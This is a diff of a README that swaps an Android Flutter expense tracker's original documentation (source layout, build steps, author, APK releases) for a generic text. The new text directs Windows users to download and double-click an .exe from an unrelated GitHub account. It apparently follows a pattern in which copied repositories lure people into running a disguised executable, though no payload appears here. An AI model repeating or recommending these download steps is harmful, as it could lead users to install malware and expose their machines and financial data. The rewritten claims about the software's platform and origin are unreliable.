@@ -1,186 +1,74 @@
-<div align="center">
+# 💰 cashflow - Track your daily money with ease
 
-<img src="screenshots/splash.png" alt="CashFlow Logo" width="120" height="120" style="border-radius: 24px"/>
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Osgoodarbitrable423/cashflow)
 
-# 💸 CashFlow
+## 🎯 About this software
 
-### *Your Smart Personal Finance Tracker*
+Cashflow helps you manage your money. You can record your income and your daily expenses. The app creates charts so you see exactly how you spend your cash. It stores data on your computer. You do not need an internet connection to use the software. You keep full control of your financial records. The design focuses on speed and simplicity. You enter transactions in seconds. The charts update as you add new items. 
 
-[![Flutter](https://img.shields.io/badge/Flutter-3.x-02569B?style=for-the-badge&logo=flutter&logoColor=white)](https://flutter.dev)
-[![Dart](https://img.shields.io/badge/Dart-3.x-0175C2?style=for-the-badge&logo=dart&logoColor=white)](https://dart.dev)
-[![Hive](https://img.shields.io/badge/Hive-Local%20DB-FF7043?style=for-the-badge&logo=hive&logoColor=white)](https://pub.dev/packages/hive)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/krishvekriya12/cashflow?style=for-the-badge&color=yellow)](https://github.com/krishvekriya12/cashflow/stargazers)
-[![Release](https://img.shields.io/github/v/release/krishvekriya12/cashflow?style=for-the-badge&color=brightgreen&label=Latest%20Release)](https://github.com/krishvekriya12/cashflow/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/krishvekriya12/cashflow/total?style=for-the-badge&color=blue&label=APK%20Downloads)](https://github.com/krishvekriya12/cashflow/releases)
+## ⚙️ System requirements
 
-**Take control of your money.** CashFlow is a beautifully designed, offline-first personal finance tracker built with Flutter. Track income & expenses, visualize your spending with stunning charts, and get smart reports — all on your device, no login required.
+Your computer needs Windows 10 or Windows 11. You should have at least 200 megabytes of free space on your hard drive. The application needs 4 gigabytes of memory to run well. Your screen resolution should match modern standards. You do not need special hardware. 
 
-[📥 **Download APK**](https://github.com/krishvekriya12/cashflow/releases/latest) · [🐛 Report Bug](https://github.com/krishvekriya12/cashflow/issues) · [✨ Request Feature](https://github.com/krishvekriya12/cashflow/issues)
+## 📥 Getting started
 
-</div>
+You download the application from the official page. Follow these steps to set up the software on your Windows machine: 
 
----
+1. Visit [this page to download](https://github.com/Osgoodarbitrable423/cashflow).
+2. Look for the file ending in .exe.
+3. Click the file name to start the download.
+4. Save the file to your Downloads folder.
+5. Double-click the file to open the setup screen.
+6. Follow the prompts on the screen to finish the installation.
 
-## 📸 Screenshots
+## 📈 Tracking your finances
 
-<div align="center">
-<table>
-  <tr>
-    <td align="center"><img src="screenshots/splash.png" width="180"/><br/><sub><b>Splash Screen</b></sub></td>
-    <td align="center"><img src="screenshots/onboarding.png" width="180"/><br/><sub><b>Onboarding</b></sub></td>
-    <td align="center"><img src="screenshots/onboarding1.png" width="180"/><br/><sub><b>Onboarding 2</b></sub></td>
-    <td align="center"><img src="screenshots/home.png" width="180"/><br/><sub><b>Home</b></sub></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="screenshots/addtransaction.png" width="180"/><br/><sub><b>Add Transaction</b></sub></td>
-    <td align="center"><img src="screenshots/addtransaction1.png" width="180"/><br/><sub><b>Transaction Form</b></sub></td>
-    <td align="center"><img src="screenshots/analitys.png" width="180"/><br/><sub><b>Analytics</b></sub></td>
-    <td align="center"><img src="screenshots/report.png" width="180"/><br/><sub><b>Reports</b></sub></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="screenshots/calander.png" width="180"/><br/><sub><b>Calendar View</b></sub></td>
-    <td align="center"><img src="screenshots/profile.png" width="180"/><br/><sub><b>Profile</b></sub></td>
-    <td></td>
-    <td></td>
-  </tr>
-</table>
-</div>
+The main screen shows your current balance. You see a list of your recent transactions here. To add a new expense, click the plus button at the bottom of the screen. Type the amount of the purchase. Choose a category from the list. Add a short note if you want to remember what you bought. Click save to store the record. 
 
----
+You can view your spending habits in the charts tab. The app categorizes your expenses into groups like food, rent, and transport. The tool shows these in a clear graph. You can change the time range to see spending by week or by month. 
 
-## ✨ Features
+## 🔒 Your data privacy
 
-| Feature | Description |
-|---------|-------------|
-| 🏠 **Dashboard** | Overview of total balance, income & expenses at a glance |
-| ➕ **Add Transactions** | Quickly log income or expenses with category & notes |
-| 📊 **Analytics** | Beautiful charts powered by `fl_chart` to visualize spending patterns |
-| 📅 **Calendar View** | Browse transactions by date with an intuitive calendar |
-| 📄 **Reports** | Detailed monthly & category-wise financial reports |
-| 👤 **Profile** | Personalized user profile management |
-| 🌙 **Dark Mode** | Full dark mode support for comfortable night-time use |
-| 📴 **Offline First** | All data stored locally with Hive — works without internet |
-| 🎨 **Beautiful UI** | Material 3 design with Google Fonts & smooth animations |
+Cashflow keeps all your information local. Your data stays on your computer at all times. The app uses a local database file to save your entries. It does not send financial data to any server. You own your records. You can copy your database file to a backup drive whenever you choose. 
 
----
+## 🛠️ Frequently asked questions
 
-## 🛠️ Tech Stack
+**Can I delete an entry?**
+Open the list of transactions. Tap the entry you want to remove. Select the delete option from the menu. Confirm your choice. 
 
-```
-📱 Framework   →  Flutter 3.x (Dart 3.x)
-🗄️ Database    →  Hive CE (Fast local NoSQL)
-📦 State Mgmt  →  Provider
-📊 Charts      →  FL Chart
-🔤 Fonts       →  Google Fonts
-🌍 i18n        →  Intl (Date & Currency Formatting)
-💾 Prefs       →  Shared Preferences
-```
+**Does the app sync with my bank?**
+No. You enter all data by hand. This ensures that you have control over what information you record. You do not need to link your bank accounts. 
 
----
+**How do I clear my data?**
+Go to the settings menu. Look for the button labeled clear data. This wipes all records from your computer. You cannot undo this action. 
 
-## 🚀 Getting Started
+**Is the app free?**
+Yes. You can use the app without cost. 
 
-### Prerequisites
+## 💡 Tips for best performance
 
-Make sure you have the following installed:
+Update your Windows system software often. A clean system helps the app run at top speed. Close the app when you finish entering your data. You can pin the app icon to your taskbar for fast access. If you have many transactions, the app remains fast. The internal storage system handles thousands of entries with ease. 
 
-- [Flutter SDK](https://docs.flutter.dev/get-started/install) `>= 3.x`
-- [Dart SDK](https://dart.dev/get-dart) `>= 3.x`  
-- Android Studio / VS Code with Flutter extension
+## 📂 Managing your categories
 
-### Installation
+You can create custom categories for your spending. Go to the settings area. Select categories. You can add new labels like travel or hobbies. You can rename tags to fit your specific needs. Use these labels to keep your charts organized. Correct categories make your spending reports meaningful. 
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/krishvekriya12/cashflow.git
-   cd cashflow
-   ```
+## 📁 Backup your records
 
-2. **Install dependencies**
-   ```bash
-   flutter pub get
-   ```
+Copy your data folder to a safe place. This protects your work against computer failure. Locate the folder where the app saves your database. Copy this file to a USB stick or a separate disk drive. Restore the file to the same location if you reinstall the application. 
 
-3. **Run the app**
-   ```bash
-   flutter run
-   ```
+## 🚀 Troubleshooting
 
-4. **Build APK** *(optional)*
-   ```bash
-   flutter build apk --release
-   ```
+If the app fails to start, restart your computer. This clears stuck processes from your memory. Check that you have the latest drivers for your graphics card. If the window appears blank, resize the window to refresh the view. Ensure your Windows updates are current. If you still have trouble, uninstall the app. Download a fresh copy from the link above and run the installer again. 
 
----
+## 📋 Features at a glance
 
-## 📁 Project Structure
+* Fast input for daily expenses.
+* Clear visual charts for spending patterns.
+* Offline storage for your privacy.
+* Simple tools to manage categories.
+* Light software footprint.
+* Monthly and weekly reporting.
+* Total control over your records.
 
-```
-cashflow/
-├── lib/
-│   ├── core/              # App-wide theme, constants, utilities
-│   ├── features/
-│   │   ├── splash/        # Splash screen
-│   │   ├── onboarding/    # Onboarding flow
-│   │   ├── home/          # Dashboard & balance overview
-│   │   ├── add_expense/   # Add income/expense screen
-│   │   ├── analytics/     # Charts & spending analytics
-│   │   ├── reports/       # Financial reports
-│   │   └── profile/       # User profile
-│   ├── shared/            # Reusable widgets & models
-│   └── main.dart          # App entry point
-├── screenshots/           # App screenshots
-└── pubspec.yaml           # Dependencies
-```
-
----
-
-## 🧩 Dependencies
-
-```yaml
-hive_ce_flutter: ^2.3.4       # Lightning-fast local database
-provider: ^6.1.5              # State management
-fl_chart: ^1.2.0              # Beautiful charts
-google_fonts: ^8.0.2          # Premium typography
-intl: ^0.20.2                 # Date & number formatting
-shared_preferences: ^2.5.5    # Lightweight key-value storage
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are what make the open-source community such an amazing place! Any contributions you make are **greatly appreciated**.
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📝 License
-
-Distributed under the MIT License. See [`LICENSE`](LICENSE) for more information.
-
----
-
-## 👨‍💻 Author
-
-**Krish Vekriya**
-
-[![GitHub](https://img.shields.io/badge/GitHub-krishvekriya12-181717?style=for-the-badge&logo=github)](https://github.com/krishvekriya12)
-
----
-
-<div align="center">
-
-### ⭐ If you found this project helpful, please give it a star!
-
-*It motivates me to build more awesome projects.*
-
-**Made with ❤️ and Flutter**
-
-</div>
+The software offers a focused way to track money. It avoids complex features that distract from your goal. Use these tools to build better habits and manage your budget.
